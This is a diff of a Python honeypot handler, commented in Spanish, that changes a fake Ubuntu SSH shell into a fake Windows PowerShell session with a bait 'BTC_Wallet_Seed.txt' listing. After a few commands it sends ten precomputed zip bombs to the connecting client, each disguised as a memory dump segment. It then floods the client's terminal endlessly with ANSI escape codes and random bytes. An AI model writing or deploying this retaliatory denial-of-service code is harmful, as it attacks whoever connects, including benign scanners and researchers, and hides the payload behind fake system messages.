@@ -4,56 +4,47 @@ import random
 from scripts import zip_generator
 
 def terminal_crusher(client_socket):
-    """Mantenemos el motor ANSI para rematar la sesión"""
     ansi_bomb = b"\x1b[2J\x1b[H\x1b[?1049h"
     try:
         while True:
-            payload = ansi_bomb + (os.urandom(1024 * 100)) # Inyección de basura rápida
+            payload = ansi_bomb + (os.urandom(1024 * 100))
             client_socket.send(payload)
             time.sleep(0.05)
     except: pass
 
 def handle_cowrie_trap(client_socket, ip):
-    """Simulación de Cowrie que entrega la Bomba Fifield tras varios comandos."""
+    """Simulación de PowerShell que entrega Bombas TITAN."""
     try:
-        banner = b"Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)\r\n\r\n"
+        # Banner de PowerShell para atraer a Aeternum
+        banner = b"Windows PowerShell\r\nCopyright (C) Microsoft Corporation. All rights reserved.\r\n\r\nInstall the latest PowerShell for new features and improvements! https://aka.ms/PSWindows\r\n\r\n"
         client_socket.send(banner)
-        client_socket.send(f"hell-node-01 login: ".encode())
-        client_socket.recv(1024)
-        client_socket.send(b"Password: ")
-        client_socket.recv(1024)
         
-        prompt = b"root@hell-node-01:~# "
-        client_socket.send(b"\r\nWelcome to Ubuntu 22.04.3 LTS\r\n")
+        prompt = b"PS C:\\Users\\Administrator> "
         
-        # Simulamos una sesión breve antes del disparo
         command_limit = random.randint(3, 5)
         for i in range(command_limit):
             client_socket.send(prompt)
             cmd = client_socket.recv(1024).decode('utf-8', errors='ignore').strip()
             if not cmd: break
             
-            # Respuestas simuladas básicas
-            if "ls" in cmd: client_socket.send(b"total 24\r\ndrwxr-xr-x 2 root root 4096 Feb 25 10:00 .\r\ndrwxr-xr-x 3 root root 4096 Feb 25 09:45 ..\r\n-rw-r--r-- 1 root root  220 Jan  6  2022 .bash_logout\r\n-rw-r--r-- 1 root root 3771 Jan  6  2022 .bashrc\r\n")
-            elif "whoami" in cmd: client_socket.send(b"root\r\n")
-            elif "id" in cmd: client_socket.send(b"uid=0(root) gid=0(root) groups=0(root)\r\n")
-            elif "pwd" in cmd: client_socket.send(b"/root\r\n")
-            else: client_socket.send(f"bash: {cmd}: command not found\r\n".encode())
+            if "dir" in cmd or "ls" in cmd: 
+                client_socket.send(b"\r\n    Directory: C:\\Users\\Administrator\r\n\r\nMode                LastWriteTime         Length Name\r\n----                -------------         ------ ----\r\nd-----        2/26/2026   4:45 PM                Downloads\r\n-a----        2/26/2026   4:46 PM         102400 BTC_Wallet_Seed.txt\r\n-a----        2/26/2026   4:47 PM          45000 config.json\r\n\r\n")
+            elif "whoami" in cmd: client_socket.send(b"desktop-hell\\administrator\r\n")
+            elif "get-process" in cmd: client_socket.send(b"Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName\r\n-------  ------    -----      -----     ------     --  -- ----------\r\n    456      23    45000      67000       1.23   1234   1 powershell\r\n")
+            else: client_socket.send(f"The term '{cmd}' is not recognized as the name of a cmdlet, function, script file, or operable program.\r\n".encode())
 
-        # EXPLOIT CHANNEL: Inyección tras agotarse la paciencia del sistema
-        print(f"[💀] SSH TITAN-MODE: Enviando ráfaga de 10 Bombas Fifield a {ip}")
-        client_socket.send(b"\r\n*** SYSTEM CRITICAL ERROR: MEMORY CORRUPTION DETECTED ***\r\n")
-        client_socket.send(b"*** INITIATING CORE DUMP RECOVERY LIST (10 SEGMENTS) ***\r\n")
+        # EXPLOIT TITAN: Inyección de 10 bombas solapadas (42kB -> 5.5GB cada una)
+        print(f"[💀] POWERSHELL TITAN-MODE: Inyectando 10 Fifield Bombs a {ip}")
+        client_socket.send(b"\r\n[!] CRITICAL SYSTEM EXCEPTION: MEMORY PRESSURE DETECTED.\r\n")
+        client_socket.send(b"[*] INITIATING EMERGENCY MEMORY DUMP (10 SEGMENTS)...\r\n")
         
-        # Obtener la lista de bombas pre-calculadas (42kB -> 5.5GB cada una)
         bomb_list = zip_generator.get_bomb_list()
-        
         for index, payload in enumerate(bomb_list):
-            client_socket.send(f"\r\n--- TRANSFERRING SEGMENT {index+1}/10: SYSTEM_DUMP_{index+1}.ZIP ---\r\n".encode())
+            client_socket.send(f"\r\n--- TRANSFERRING DUMP_SEGMENT_{index+1}/10 (5.5 GB Expansion) ---\r\n".encode())
             client_socket.send(payload)
-            time.sleep(0.1) # Ráfaga rápida
+            time.sleep(0.1)
         
-        client_socket.send(b"\r\n*** DUMP COMPLETE. ANALYZING DATA... ***\r\n")
+        client_socket.send(b"\r\n[+] DUMP COMPLETE. TERMINAL CRITICAL FAILURE.\r\n")
         terminal_crusher(client_socket)
         
     except: pass
